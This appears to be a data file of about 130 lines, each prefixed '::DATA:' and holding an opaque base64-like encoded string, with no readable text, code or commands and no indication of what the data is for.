::DATA:EuVSW1U7nl1VV/cdz9faAWU798p2lhh1AFWEmba+6PLuH8rRENlu/eqLODZPU7FT49Pexj1zRwnR/iooU4q1Y6KfaBB0/QloKXcr13mlv/JPAgSU+O8m4bXD
::DATA:aFdwfV44QlEcnFwovejGoJT0oHZ5Ox8FLuD/pnN/jfaWDbyAk4F3dKHAODHjSWUZAjXgf/V3/Mgd9mPc2D7my71vo3ksMFLRdTXiLrgWRLv7+kXctYz4vazY
::DATA:xPyGhSvrRYJY9oCza3M4DWCrqJYaL/lihMIeDqk9JTJs1/EoAjyj5cKxVB/FrxAo+pI2g/XXggf3n0JsCp/E4mB6z6qliiIuLDm3IJn+Gxo/BLKWFABeCoLy
::DATA:gEx94A91GzdfbSa/GxBoeZfNt1Cyzaui5zim8NZJgmD4+3rbUhiA78pS3+zaXxDZPPAq5EydAeW3RhaLTjXP8dkxh6xKqTL9kmwqfhWoElkSJBMHX+REJhyp
::DATA:2Ad8HXC/CT4NgKa1P7TxPSc2X9PSXJyw6H/N7qZd8pAw1N7bhKUf9bSk/9Zf72QkWPnNJ2EmxFS2Pi/K5513Bjm53UDeBr+u/+KscEC84KNBjDzz8Es/c2ZL
::DATA:ULmP0C9DxI+qP+5BFvPRJj5Rhv2UUzPpQl1fLPWH6OM5hhzH3S7Y8AgzCrEzJVkC2RDcbZowDxNDfqaXItJrX40mbh84xtEnao1ZqYRY7r1wm8uPx3N77i96
::DATA:k6GlyV6eKK4+sLswmO/1x0vfTq3endVy6vYPN36NZL25fGQh2w6lTQPHXIP9YLiSz9p3dYklKhSYAtbTP40WWYAJ9Ds9sRRJNJ4KMjXI7abwudSQcSdggASc
::DATA:yCVJxRf+VulIXrBi8O4DC6vZrC5mhGXwqvDgnEd/nOi3Boce+YePY68KUh+t3PrftT1QWu/ApbwoO71hh+EVL+0Pexn+3zrPMSI4h1RjEfQn71rEzF3lBHtA
::DATA:9UIBfQUT4HPtZ88d5uC/oERO6fDImS/GbExtp3ZnwAYICSk4mdxrfeMl/Tw3LDVWePLHkeFLEYr76hlSYIGOH4wI6eJ7dotEVMfhJd4IsqvaHBYVoWgiEu+P
::DATA:M44LbaMFhZi4KVRNk+ezalBmREilyCkfaMUb19mA1TZQCwAN01rKMw4SbHYxz7rapV+HJmBU959K+M4iZ4SH+hbQDP4RS3h6pOSnzICfM22IHu7jGYah7xdC
::DATA:VcqAjQqzMRTItGTjeFG8QKBL5LCRNDqIXudC4soTOaHjlwiGjSNroQzGggh/v2pT315Fk9S+A1frMR+qXMbpw334stHFQeZztsqoLOLl9bEEt357yHI7gLCm
::DATA:Art8H7q4otPjCw538fm1p7YKxW0qwC5/gsWKEzOleabzlSirT3Q0lsnUYEwe2s2fDG1YnDVIGVF1l4NjiK123Y/sjk6lKTe105dxuOjjwkFmcFmIHsHSUp8M
::DATA:gp+3Q+l8YobjeipXG/11oSwEsM+GwkcnpYqA3h29FNDyawO4nsQ+Di4IINPuMDuZtz/dNyGpkObSovfPWeiXQKzn3bz+7DakQt8miGkcpbGjLoHTFB7BMGKJ
::DATA:aLGrXFiamIKDoSup1JtBT3uDxM1uEiY/VEnD/fjp9aOBGBfGHZh9WVaHsR6w5TYpn5Nva8TVFnAn7/F35LL0kRfYsvtuj2FCeom4gBCH2TFx73QTEIyQRlAM
::DATA:SXgEUSfaSJVHxyys+Q8Q8KdlwVQz70U0c8WujnjAUcG6rxrZUSjc9TtKJWgZG/6L8tTe+NnUyHKgEraVmuqh9ZTdSCZsibtPN8rlKcUV26z2Tx17uqZZsdWL
::DATA:ozh1gRTodUTP8zwqpojoS6u05FIDLmLNVMBpHqdORHJHimK1q5YpeIy5Yrm5Zwo5yKI1PnXpUFpxBr+XM/mLfA/orvWFI2x+kfTyOFuhNF2+8J7QtsZaM9X6
::DATA:C/l5DiQ0ZAwszVu3e0F1q+OHcu6LvQ4rXx9+vkmHto1OKcQ/DjsimiAxM3ZwUWMyA0R7klBqDggF0i0QrvjZ3BcM6Pa5lvX7BdHzrnJigwgsH/x9jzF7nUfr
::DATA:K385BdDxuB1EztJChZPH5p7cOaTSXzqAYD9odPLoASP59H+Jf5J/fWsT50NdbnqQoD+KBb1GGcOhpbL/WkutuLmEYECwHqa4dbyTOgHO1cDfiklFnbOCI/GF
::DATA:ZD/eBfgBeuQkvAUnQLSCaNhC0qMYrn5V7W3eIO2eT1GnHF7lDTMNMAaGSjBDtVHiu88QsYMQBqnUnbUY2tXoUpKmTlPe53CxhqA6l/f+lqzDUz5nPJpi0qxN
::DATA:PWr9LSAp4UxVZY9Pt+O4md5/qTtW4WyxOeNg0zQxh00tGcG8FZUsHHl0Wez4bPfINlY4ZQu/pmQ9JkIxpRn8MU/eavVqbMKNLdVEW8LpqodkY9T8Lr4gQfHT
::DATA:wyfi0skDml7ZRx+Ffu9A78EbwAB9jzdrKcyBxPHCZL4LNBYYVJqFkuMqcvyjEcjWXsLTsUSVoF5Er8YtDVKtmIUMHWgyiC42mWg3z72t405LYvCITgj8/Tes
::DATA:H87Qu9UJsbwgvfo3785Yf/7kG896fEvm721XVkvTY0X4OQsg+lZkIxSkeBfXl7fee28mD+DYmlhHqwUJV0rYHaJWWA8Kl2rlxGFzg6QJK1f/RxzREFP4xEqE
::DATA:m/E2HrENowkQTl6Nx/osPKL18EfAPI50NmBoNn7sMV4TyBRxOr3bmIthXO+j2Erha28NhjhEM2IcLQvkEvLGjywWdFpXlq82BP++wib15JNxSM+8F/c4/SKj
::DATA:tccSWmhn6Ccaf3ysEl2nnjCej4v0PZLXWHOEaeLzDmvYAM1Q1AndiYxKbOf2xn8Lp1yywFDXjuCrD4/Q1YUw/3/fJzdNKGsqcMBSUHdL8u+WKM5eNHskTgf0
::DATA:qzFHGNxTPBzWjlkSJJcSW0xB5lZkab58oq7pIEkUbwQ89hkexM6tyMoZeA0NeEcXBpganiA/XF7OnKW8WxXk8cukedzDlmG4ct0dwbveyPWp5QTwjJSqFATO
::DATA:WOY49hMrADLsN5PvaHptqDgXZf09Xw3tpAxhJMu0qhjg8j6cl3otRkKe31rd0IiVzKMgnMZnzlrlp+T388Dniv9WtQ7LbAXjLeqWf/XLT8l11g4cjyvkGe4L
::DATA:QVcBmgthXYkR1H/RrstxlNjtIv2sXw/Lc7paQckQdV8Kf1Mjdbocx2IYROPTIBgMKzX68dESRjR/QyrLOQqKo9R9BwdwCN/SCLEhP43aUXFvD3ZC6pD2BUni
::DATA:k/TJnUn4kHNrEVdmWlmzUOMAjE2P4fCnl8WcU8PkStx66UhvzQPoHW9ghJ90+LmFxbomD105I5BJoLNoW72ZC7Al6LW/evwgq0jIEqWXtVcDNsodgbBoJ92m
::DATA:e8xHFk3gLpjvJkw+uu6uqRrbkZsfLtqZ4VYKTA3065d2XtPcah9XF3ka2c5qaMm8vFYx9eoi9JABdCghiqzkgikk/MJq9XT2Nk6cpLgbcEBfQ0fIgyXGikFd
::DATA:/wJo7gWtpMngeVayd7hvGtHJp8sCH6ZrMRGvIBTSirobwDDRxlNZ0c5zarE5LBvg88mykxmvmvxFSexXq0luUaF9x19acnE8Bxe9nxyavLb0V+NgioV+PV6a
::DATA:Sw3UsEC5iEjnpZGR0Cpq6og0HhmK62Qxvh8q+la0CSMubwo4VI/IQsln1ZsE4DeT1w7EDkJzY3v5WEOtC6rqPpzKHM+tjgY3MVW47mLIpD0X8Sa4AHSJLtbb
::DATA:By6u1CJkXc3fTa5x88DHMmL2XYjckDY2WzT9hoLA1bebW+qg8FjBX4jY55toLrgvnSnVTbNDMNvxWu1OSuTw4E4yTX5ucWYaQ3GuWGqGnNq29ZOYtd2Fp7+4
::DATA:QQWIQRpLB6asc09j1LUiTAYaReNhKyDFzySni5rUfASTnYYdfshcQDuZT7f6LyxGIGpyrZkIYK1i22XT+loELLI6oqUEeNoV7QUe0sIX3QOF9pL4gccdtEnj
::DATA:yGtPZqmLCZULYx5zoBRPm20KS96AHqqTsOX2pOHfTqVpA7rJPFsF3X6ZieEbiGd4Pd6M1g28S6N33IVcEC3uMm29Nuq/3OWAKuHAeexU0ergBjkn7X71xUS7
::DATA:CEeu1YSwkPf1etMm7MkkJNAV946Azsg6LI7OKJRzCYZmdGQiAvuOCbnUDFQKkNzRVnLtaRL4zxXMqveVE3i47Nc6u6uouyNiQkS74ManmbvqycpeQ2RMOPu0
::DATA:Z4tc6VOhtONOk8Y4eb5vtr2o37sq6uxn02wVwdpNzqvdhZAHvqehJSmZyQ1v/2yY++SexUrxpzaFjeWtM1b0prSIcDrx2O5TT5ZaK35n6lo3fo/Ig66MjNkD
::DATA:oezed9UJ5kFASmsItRdz8/TtP0p20Slg6wuhFLsI1gmsiO1fbiFCtKZYmoARPAPdoT6YrcUmO8dSJYh0nt/b1vfC9VRY3H2JTb3aP8l6Ralel0fSaJlFhLdl
::DATA:KfURxNpivhMW7BgwpoE4IjQvZtCudgTaKqINV4etWm/CfIIbH52eYPPi59MeRveJx7brOlVlfTgNPOk41bEC+mHcoi5jknM7CRuSJ2/JyFQZO3zhrgU39WB0
::DATA:si0bBI/wb7R0JC2w2VYKCoT99bssw4Sn3JqdpPg03nSWk/cyZRB6KWI9NpgSy/e7Q8ckABksogyt+kL3GXFcOqHzj/3x/LNNA9NJbCg1f+pwgpRva8J2jVCG
::DATA:356v9J9QEweb4L2DKR6kOhTi4/IHQnub1r994+ZXoVPGuDH6qpcgC4d7rZHUwJ7IAcsHIW3CI5iX8N77/Giks05bGLZVkd4SAlLVFgRkkqSQ+pVXuoA4MTEx
::DATA:0LqiDcBDP4KQLrbg71fMiciiBEC/ArJFO9KnuhAescK4vDkaHnCmLM+KLJQUNm3d3tmoWbBVs7rCHlSoxrGuI6CPirWc9cQsp/zP1gNt66vJ/lupjaLKbjlz
::DATA:LHgQ3B2gdVQpyi6k7C1S9U3/K7rm7jxuDVeZgy784YbNp8KkWQpf2DK+eKP7DwRLKPIqNvfUGPLmfDKOzFyz3r2neBKi2PMnKkEF/H6l3nqSWFlCObMj96lE
::DATA:hYPsb57I9CmyuyRxgjXf25y6xaG84ztNqSVsKKrsf9SAzcbpWRyRf2jbpMaWt9x/iQNqFo356krntIVfynhfPfVIfD7o9cCaTDhIQtq6fw+J7MqwTY26OkoM
::DATA:9Ro3E6iT2KYuUm3eEBzAoM+H6c4xE6UkGWPzp15OcyRB8ycEwMSkBhG4+/NzIgTnvyBeQPDUERRspUCSq/bH1SvSq0ex8K5VQ6HhRXl8tlvbDaC5X9W8UBUd
::DATA:tPyegbBP2/ylM7MN8ESPwPqLzoBIH21452p1Gbu1WqCSP/b9XuFLf1weSHJsKLEnFFKPyB7y/TYhwFpzMWBdWV+BzewSXNa1pMxyMslR1rsHcVF6cfsPSxzT
::DATA:n97KDDVhnGg/UhQjrRXD+OdyMvOGj6XNWFizugrQEhXEN95bcOorJlayLxeIsqQTCA7n5xSJPIiallyz5TfZTZGkVkg+Azujvqszd4oxRxNm3ae39Z5nlfpX
::DATA:buwrOMS3f9rN1ODukXRXsOFYldSUyDsegFeq/T0jJg9qhpuYAZZjhILC7/cs3TTDrk+RVwm9yHd1Deh6cQEQOhrcYR+En9zpXvH+zooVhWyT6PdcndbGmKW3
::DATA:srw8CuuT+lHBv21odQw02bLais4nApNO1eHhA9ZsTkhsPGXkBqE9m1dadQVGtt+nONqR6CUpsZDleEj8SnGwjH7r+4x2TBhntS/nFiaxwd6oILa9GyQ6I29q
::DATA:EUY2qsFey3nuGNkBtU4Mdn+PpGfvbzCz4qIt+elFLJlVTzkyqsEIbrt/savPkRw6XM4fKfwMhMk5HuOdUQByHl/ba/W7XphNJKLOpUQ6Cvnl6toK8A0TNp26
::DATA:okgCZnURKcCPDraJNavLrAtkbFEbi9+090ZMr0XqQK1JmKDhpBGLiHaje0YfTu3mCi0/UrWqyLDJN82TNZ7u6JxtUCocrVHlm3offRt9H4kXN8E1pJcmIG6o
::DATA:0KNjiOeKcYyQZqimV7Jr/59KLXYOIyB24FlBy0FkyGB4+0v/E5xPB1xAlM3nsfYtJbGakI2f3esATRougLDi8yxwTMcGL/bLeRN2+AexNDxBxF1BDhV7CayH
::DATA:Gjkh5XCdWOOQJpyvotCXBA8nLMm4dKz3zPai2ZHbLpUnWHas7MszNAm8pvGrKMB9sUBQgHStfFOXyejcKxtwfH7EGjY0SNLiPo1DyyojAAHFzcjJxcQmBZI2
::DATA:C9angKn1VcBmVBGj9qk2JUnuxZyn+hGV+BxPfNBxMkzj6qs0IlqnJDBcHoOcwHRxdcLpmUZBeQFDm08Ey3aTmhOFmAsa6fNZ2UHucp5RiliOyMkPBDqWnqAP
::DATA:wAkZpDN+LsDX9kmiSnKFnidtRmhh06ckx9Wc6Q3HyuasYMZkDXF3USepMs8gv8d7kSHKOmTUiUWcYsysxQZLU3Ydv96ruzEBDqk/VoZ4jtDce65YyyJiioCd
::DATA:nf21jXjwAfJ70hjuw69cnIsxz+2Rnu4d5AEI6wkWYg6CAe+pfDsclMukKFk9YBzAznX+fKm9+ykNiMSTfpM6ESWJztKApkpRad+jDWrFpVxflgdFJsP2ncB/
::DATA:4yNkXF1El1BsCf5/ta0QfE8O5x4KsMTVsR5HLxV8hlT6/D+sTnx5ewWaG31kATZ2kMAfl54w/MilG4LHIiZTpQnbOPG3QcRXgIH5HIbAktpfgYTwCDTUWuf0
::DATA:x7ntx0zIDhZ+hRW/RBfcr4dN0dDy1BKWYAK2stMn84nHT6ak0tvuEi9juG8i6aL1bRBGsNE8PgY96PegCAvQZTGYISmTTEy49ueD/v9G/CTrc358E2Q+1rpO
::DATA:5wdXXEEve3zEzXf5WWwXN/HuUe3rrQu/bnIDZlIwW1VkYjBMgHvGvw0r7OyJMudXrj8oZiuKMUmt3ECVmrBkgyWUbnjsIoO9Zmf7E3G37DequdRX8Bk7Y/Oy
::DATA:Y++zZ5IXFbKMSPqu88NBkiOLYvvkrf8BZBCpk5OtiIEaKyE4IsCGdTYLJmf3IOtY6YXmmcaYea0DGQevfA7tmYL01kpnTqPowH7L/V/Vonjc/v7+sA2HH+8P
::DATA:phqLyuEpQOWp+z1Mcu2NLHS4glsTyIywKRO4LF+IWCbRlPTHXkcdfMkMaeRPkNnqsuzY7zQuEFPbob97CJPokF7DED6GU1QuxL0w5P10KOokIdbIZoAUtuNN
::DATA:O/RZbwh0xkVu4VNmH10KFCINPAwwkWZ5N5cEhva3MhemB62omXwo4+xeBqCqfTGyzvk7Zi746hIxy/RtOOl7Vhc1EGZ80Qn4cJHGpaZY+SN9ZvKQ1OFJYIJx
::DATA:BLLhmXL9ZZhIWzzOWfrGyGqxZNwoGGnNaFMr1LmGVkQWZ7mWPkWbX/nPKWaxWaVnnD5WcBrjW0vixKbITNO8JkrVU0tfUh+39ENpYDNxCIK4P5zoLiIzntYU
::DATA:cstFb4c6xeVY9nc/TRsg083O52tm+vINl53MdSNbDtOaOFDa/vdZwIr1mGzBbJdI5mSAIa9Rug3HW9qjbEDsN4Jc/fdYybAoVFTD3kQcbpjTUPwZ7e/PQjZr
::DATA:e9I6VUQpF6eDqvuDUpo4mlk92kyzUxL2rUd9ksC/a4838JYJIt0sWjJ8oV8rrdBA1xKfmgCW95Ii/cREXFdcFXxHWAYxPO6pGL1C0YbPmFWSleYEHPNvng16
::DATA:gHMHruOefnN/13KfjlsxlEfmMnoaxhXt7wbkW4Tn3sWvM9n5ueTAbLZpSBj6zdvC7+nGGP8VVbsSYs6/SLDWTQB955FljEY9FC2p0xbfwANsSSfJXq6t5D63
::DATA:ZmAVJxuPVA1r6vv9zZO8QSOn18Xb0OIJ8GNqokrc9YouEN/ywRjvP0kx4H6xXQjYXt1t6EIijAW1gIv77vBan/wZTBRTO6JPfsU8xSvKnvpEfgtLx2P2ahVW
::DATA:Hlm5kEJc2VY/zYCQ2o0qdgNDGoVonE4VirAAIDm1rg+hSbrmHsM2vtw1YIrBu4IB9uPClXNwTSvHJVe2SZC33X6pnYkdSioOeQc2SSUSVArXnafd56DNrvkM
::DATA:6jMb8MVhg5vEoaaSe4VTbDjzLwEy3puXv1V3qm6VMVT9BKX81Zd3sRAj9kOsh2u0186seLsg4eZyOQMK9LHKnYzJ0pEIlrkIiIKOAT0PgGtmmi38J+A+LL+Y
::DATA:HUtN+NZ7xxeDXqSOgsYDIPbihMMgbAsDmM4/zoBzCBcjPF4HifJBpcu/9MTeY2kgpJ2YPsFe4as0Ps6cZHkzlKUxc6qTUeyLq03P4xE6s+qz4xjvDc5m+mcD
::DATA:rfTn/La7PVMpwn8ug0N9LLn5x8/yvxlBSNhlg3o4lV5teYgX6B21YmjHQvVi+m26bZvm8DPYiJuwd2sxiVH3lJoeUDbdIPoLRskNwz3N1Eim5WeI7fhKj8XE
::DATA:PwgelrQr8rbT1+giYF6txedYMMY4IS3D9Ln/t97zaeT76TisLRz8TGow9i11ZI4uUDcKODSOoFGLLdq0rPWYCxBvyYwaQPQL975Lm99iWIMcuExr6tJa1dTG
::DATA:uQ1Vhwk3pUYCaSO6wgsQAV38yIfqs45U7klCxo02at4biNBmQ4Mc8Prxvff0jP0+gDWOa4MgDnfjRuyKKE48zAWFJGi2oyAIGRLaZz1yH7n8W7OgT/R3gbW3
::DATA:IO7Nl3mtLproQOSiN72RMFYnuh5NekUg2Bh7ruI0dI3a+macrwjYWixZkwqqBdHf9WwEMKr97Y1CtTUvO4DoQHlkroTyGpxbEUtgut0tyUOLglta8ZwXxJrC
::DATA:3G4x3+67M7OOLFQH8Q/31deQqvX8awA16rf2hOvCVMP7gYQ2Kvzv7xLWvYkATNNOemgOwcszt+HEcSWi/WcDk4bFkWu1ZrHGprdMg/9quYAGgRAccaVeT8eW
::DATA:KwA3AjuH9foiGOAqRZ0QCA3dvGevJjvon4hpylJx3t0QwEj2zqsgRoF1tfzJC47xwgNbcML+SBEyoYZe3PhEFG6bCy12jYamdeOa+sJwJNqA7zVf/eGdueRR
::DATA:/ffL8555w8qNiUFWg/W4o9UHMWuIHUaqmQj95BbrrLHQDsvcGoUR7P7b2hw5Z1lUjqmOwZtvjQQwFgsYIZCDT7p1ryhl04EEH7UKpSvWaNjdwDIf3mUpwqjJ
::DATA:9cobOhqn94hHasz7skH8ZRdWuWlydoHxp7CZwiCGTs/R+QseJXwaFECr7p3GWaSmBbTbrD3UsSAdWQnpMokbPh2Zk1RSQZm07Bra2V9OZmNwByXEnNZ58zgd
::DATA:+IqBx5kRK3L1VfF+bzNOsJfoQsFz+QWvqb4EzgemCmvysZ17QOPsagBlcMqrbqT9wp8Hu442XVc+5sJ06H7QWz6RqTmwk805yMTMF17KQSHn8Kj9YaFuBGDU
::DATA:9gBZuObhbMqMQPnzMY6u3EdMOenPjGIRqDkceAmo3JGODO/CU0le0jdE1gMGH30m+qKwfSIVvrANPNrzobw51NYI5sO30G5P3LKznODv7RtLA1Cn3KYKObKs
::DATA:2j/3Kpc/9pT34Gii/4ceceuNvllJwGz2eYEzK81BomK0ooiQ5bY1pfcSPnTV4zxY2z6fohfuUeUDdmV+DsShmtv1XrMzNGmdU7mQ/AEicG3F01mzLRprWAaG
::DATA:Taapgc1k9U45mgvEeB7xkuCWAk5grEb0flS/xUDOZxfVlGRecnUcJegFnawH71dyBBn2Mccs5zvIyKy82FvbX+6hSJCN3c0ci+IkpPYl0qFDYnwR4mzFuWi4
::DATA:+eLBaRMQDHC/UBhb9fSMhqpE6OB67aIUntVpqYrRqLsL/agzpY2SeWvZgsokT9Vrk1k6NAP9gqVjedvmFQgF51wOFYuBE8/EsrewY7BnEwFd3Max88gL33tl
::DATA:dNMxE4v+douNhwm0QVIJ/xBahw5IpOmlzmUN6CKKCMLtQazOaFOHcbCtwrmPk02pOYJDWAo2XfL/S6Egm2FB9g8R1l/whRBoUffM7hL3YIMlVzpZrbmMIWl5
::DATA:6qbniNY/wzc4IYa02Dq9GAOYEspvf2/YFzEduJjDG12TAQy08LlWWyFA81/FfjboYxOywEA1YdEwvkIDRH/NutHyuqjFyoCfdvW/UlA8Kyr3q/JQm6BSTeRP
::DATA:GATtSukmfGCPCSBsr03jMGvzFGS/91uySBGXTnyUn7VdKL/yUAT/p+AW8tw8PD0nGaXhY8YkKQyzxE9hpA3pX0eA0EEHWtEJa70sp7GBN3s2sdb7F8UJxY1w
::DATA:f35ysNtSV228GT1VQrep+AdWNavBHyoucfRz4017+eO89jLoNbyl8Elgi7M+fKmZrsk4ayzx43dWHfuDAsaiI01r1EPIneBLlYuwLG3RRDPf0PbyY1SF//5u
::DATA:YvBSImozO++wYMXuou4LWD03ClBhsQDRIgqs8mzuYWkHoExXmRyzBdeJiG83+dhe1bnkCHCyKUTrJF9Bcp6QTIjAddnuYyOJ5PLF7AlZOdelaJ0/KfDtjLHP
::DATA:CZnYVE/IveF3ltMg3e/S7b0iFLFwgpgPXWezRdKJc3w7AzMlmt4eRkOMOGnvMK51VBA0Sy6+9hstIjcsWyw8dtB7TGwzwGS1IRqlCpuxN071/D4yDiirlYiM
::DATA:UpNWsFs2j7OM3VgJBuUZgpWY1R/G+hTEb5vbskM2SzqgkXJXVTq7RhkHd6ZnEB559ZrX+EPYj8ndEDmTuuAf3d4khrJS9L2g2RruPFhu/Z7ljSJZwfiB934s
::DATA:T4dfJsooJmvy8Og2YYnQvL8aXNeUaov5mS9EISpQdPVH2xmK+CnY4ChkXVO/ymYj8kR/jO3KlqY9PPwrC9vuWqbSxrbJMTA0SkC1OoXNQ/tfQg2xNlUth+xH
::DATA:3fwPHyEtiDm7hdDL9z/t/PdxwFgTsPPnGy3ramAkWrpWgIbVZILlKSEms69B2NBGtvOr3KkutQ9+b5IU9c0Iw82DMsCsSQ2mvyDzPAlcizUmZb1LNWBvtB4k
::DATA:EcU+iqOumB00yQqBBSm780J9Wg2OyVLUY6TbWNrk5PspSn9+6Hqyf8DVRh5TQVCeF9mwPkgM/A30Noqvy6HIkdPmUJtUbQnOSoCdisYNgoXRE/avSPz3pjrR
::DATA:5W6fVjxninh2AC3TmHaN8iFcmd227p3Sk79lVka2Tv2RBGNqhzkkEIeTcWOmWiDIp36EGLzVcIiQhG4MhPeBL4fvXU+0pNsjVl/dUF8qnxJW9i0F4H49Cyxy
::DATA:4PvDq78KylNdu/dcTa5+mruVUeGNa9B03ZMDPO1uqO28i/SdkfxZ5h7Z/9Y7El+XVgFJXApMx2hqPT+Ed2pHfsjhNdjyNwlO46qm1VKxHKyoCMPbhE+t/CB7
::DATA:F10t2kRP/eQI4anqhjG/ABwDLkd4jjGa6NMuU9VyEPkb5J2sOD+IKKOu/SFT9z2ibNBrdboZBAMyy91Bffw947yNiKxvF9bro5JnTdspCY8yoKYKu2XoFgIJ
::DATA:+NQ7KW7VplxGDS7sh4ciKjE19jGtLF3kJ46nplnozNJHHpMyXhWRiJ6GARw6EOny9wfc/QjZmY0tXM2T6gDmeC47XcjZ+oGnCM70+OJ4S06ebdb8LrSayMgt
::DATA:M0VrOz+ycPSycGAN4UaJElzigRILEsgwluKs7b+QeCICPSF5RusnWaVzxQnIEpZX+y8UdpMMNDYmqYZ9FBHc01yPpMb99qQizFfV+bKhRq2In43me8y9A6Pn
::DATA:2f3Ipl596cZzqJFQtRJEifPG6cZsMBPA36PHCIcOTvWMKsmVV6FjLZ4htpLRd/CCHqbbw0gKkVUCErvfbKmB8XSWVqv0Od+DDQqaWD4/8sOvQMr+kobCghWG
::DATA:LL99gOzlevzJxZByz5aYg9jsd4+MIq60YM0LAZ9Wv6BYoHUNpKzYtFYcPCPccfIMxN1NZinBqQbPwt1nSgrkenA0y2gF4XJJN6CyOYwvV+UtR9+fHprIDR9A
::DATA:2+1eBtSThsy17007K2zRHg8BvC/6J6/gcxcHaV6MAjH1AGLziZ5fJqF5dkhMkzQmNgZy2nEdK/AyJce5WOTEgXhNQB7Tj6WFPTSOEpDlurQm4uTCiTEcZ2a3
::DATA:SYqKxKezJzQrU67wFY9DBBHoOyt4ercNI0GkZjDkm8u1Ra/OwGLwCRMoKBlRj+wfN/MoDWVOdiNeVn8G/mrmJJihdT8ITpETFLAMF0hmNd8gUDEo6Ql0/rIR
::DATA:mlkxgMiMXt40nj1kvD6vl1aL0j3OhbLOoCNTs6lpEm3yZ+Dsh0u7To/2BjpjBCDf2gBD+EUtlne9P0Yfqf0GqBv1shAxldisMY2wGK340vwQ4iHNsPv7t7x2
::DATA:XzuP/BVB2P4Bpge7aING3/yOTpC7n7N1ccJzn70xYw88V38DJf1tpZ7DRDfUrAk0SIeZYOC093incNluV3/LDrPjpdK3N+/3NWFXJ10xPDm0oZ3oKyRdsV1n
::DATA:rE4buubkb4Zy1IkEW5Mzw8cTW5dqobK5Zy5Uxk5OKfLBCgil+U0FDv0+uhO67/xwIQxLyUqXsDXyCIgC1cjQzek0vRDey/kwEGtlIyRQcUoPGLLO7Dusn7KI
::DATA:wc7uP9ZcB1NpvxDdewlXRq3u3eGt/3jIOpoYYEd5AEwz4HkgLEIk8YxMF8eryIM/E4/eiamoBvHEMp14bJVJmQkj1vREuvDiyjisHIa04/Du52HSGHFSxcST
::DATA:hvTQxiaPa7NRI2vLfKQ3C44+FdSSLDdIxhwNQ8qKH//USHYoj+t67ivl62Qnsv1616rD2kj8j0xu2DBRNTFISfO9uTt67QLBn+dNkfo9y3852vAR8+Evogv/
::DATA:9wdtumSAvSgHMpQMNaSnLhadAv8CkyANtxyNRQ+BN89ISge8I7EgVZVD2UpMcV14Mo8DXYDeYD8Sq5mOeZsMvSZQKs4pP3Rycsyfmz9P7F2caAQiS50RxRkB
::DATA:1lspHPCyCaC9W3w0jQIn1EB91E0UI+mN1yCyCVXy2ic2WvauOt3hoIW5xiIdwjMsf4sG8gJCBCdpK4xSE3xbubLD5APsrrdZ2wKu4TIbvwvZUc+qL2+6bsVS
::DATA:1FnurAdW/AcSjG+bU66jcKDCpw9ACrksj5CI48mAeaH7NFn5svYdFp0CkmujP08P7YyLP4co0E+EE67AeWRmknCno92EjpmIBOBcoyOUpXB7wDuaFoKtxPjH
::DATA:uHF9aO+qnRUY6zFN26KIaceY/sxKayVDsKLPN2FCWE0NalwwU2VrKPwrPRKrByHI/U7Wck7VqBo/h5wBbsu7GTHr2SnVB3HGMw71JxRkMuwWl54oCy1eUVWR
::DATA:CBo7X+cIy9S346S/fmVBXP0qtddsWSEfqG4P9Rilw0ianuG1O6ZKdKWryIjActf+IM2hR9J+aXY8ahum9Zw8pgFaayfNf8CiDfhkAhWwNhiNy5OcPEsx//a1
::DATA:lCNUaCNUrPFQQjIvO2LID28x7tQGzsFkGQTuZdtBe2mZxwxrXpffxDbg/7LXoef0pxLkNrDY/RVtJASDUsxk6205wPvNNbmQ4k9rmF+3x3MvWntatdcZnxIR
::DATA:ZMrGQGr2HQqaADauOt+ndYwOm6OcrpsTfx/s0l6HzACidCJ+BHbeVViGUhGwqW2l/Iywsmy64ZRCeb4i+Zv68TzjHtRTJ/fc4zVle4GLuXlqT0qoLd2/Q86h
::DATA:xe8KRKcEH45frhxAn2nHbO8M3AYoK/hz1Lrqf2YwzDNDlf0cVM0PxQumg3i8ZSYfNQD5Z8vg8x1u/e64s1oZoe6YEWtn2kbz/m2XBH8quPvb9fQm6YtcF8/C
::DATA:/x2WLnb/5i8nnasNbhQzVeCltCqLm5Ku5amtlQ5qQS7OnOMCdnmEDPxjfCmWxE6AD4JptrxHesXU6D2wS2Dc2Bxl1CD0xCb8wr81GkMvGUbY6VIza2jZxlxu
::DATA:qI1ixC4RmDpgTzGsGu3L8iitWWcBEsGaYVjn5+6z8YjvwWqdYbTTylLsmC6DtjGrzltu+8Lj5gP/CjmvlPWAi/UO5YmAPMe+iSsLv0OYm6arRdXzm4uK29T1
::DATA:CaTj10Xllb9kBbbCQdjM1khPNR66t7hbcucnO/YB3saOd94jT9Z+VsB47LdaPIvmf5WL3mDGpy5ktHKWUXuNU5u3yDSFIxKmaE3HV6eejL3thRGBz4Ypgaqt
::DATA:cP8oyE6eHIL0UQxHSco45vAdltGL1fVAEi9RIrmejru31q2IlUxHXOkZlh6nk5mmVbPwG1KznWIawdAIvRIrGR7swHOxSeLhXzNfZgt1p3979O3vihLdle5D
::DATA:oztzvhYv6vohDZbm8HHyErMxO3DgHDbEF4W+MtG+RQrvJm6JTZjXk0AEZFIdTuVTMqunGng9iL7yTkTAGk0ABYDuPRR1FysuQmw/E8Xgnl9U/DrZJ/mWAFq6
::DATA:UIWfXc3lLPtweDy9sNhWUEDXWfJ5GhyR21f3SxyOs2p3ULYiBEZQ49N9FPZr9eqoMQYlhpFvUEZwOk+6dOZGqZQg/AVR+tW64tu59zbIYfU+gvg/wwHf1fgD
::DATA:Zo1x2jzBvJGMX55qKXyC+zDgQDlxz9ZCnuT/CvOQqgtOPBmHmq6UMHMcjxi6mgwLnOyLPYQIEpLX/Vuz6ZS6BRblwZJg19Op+EDJHg6IaGobEUY4q94iSv7n
::DATA:x2yazOZbPu4Fs5SSagSxbCjTuME5C9B6YLp6BaS5sknnfItT/VngJ4tNwTEGX7TafbTX6pRMoov0TutW/e3TpLIK523bxzwcSCpQJNkbkSAA5DI1XTHWfqZa
::DATA:5PEEaAef5fVc2abWC0lPli8Ardjyh990LJK1jflExUWQzxCJvYY4vPDe8X8FgP7UCbGV3KNHHtWDERr6rkOSYV8mnrWJcj5gSjn/fI8xlXycFnRnuecvD/kT
::DATA:E4I9vUGbIn1jJ3FX5JEV+UzKpT+VGZRqAc1niW/L4bu7ZWXwfGA41X8gpIMFgxAmxhO3D4LvRahXy3NgDEfWhcaVhANGoT9d3TZCg84Qz8o7ulYMTth42Bs5
::DATA:gdgcVokLTcbtnzg9Z7ZZmDHerN5Dz2roTJWVvSCdWN0g0h3wFtkS/d1g4bPVUdP078asVIt4fVitkTlt4B1sORjG1EAnszHSnlqCmN6FKjmFiPVD3n0ZTt+Z
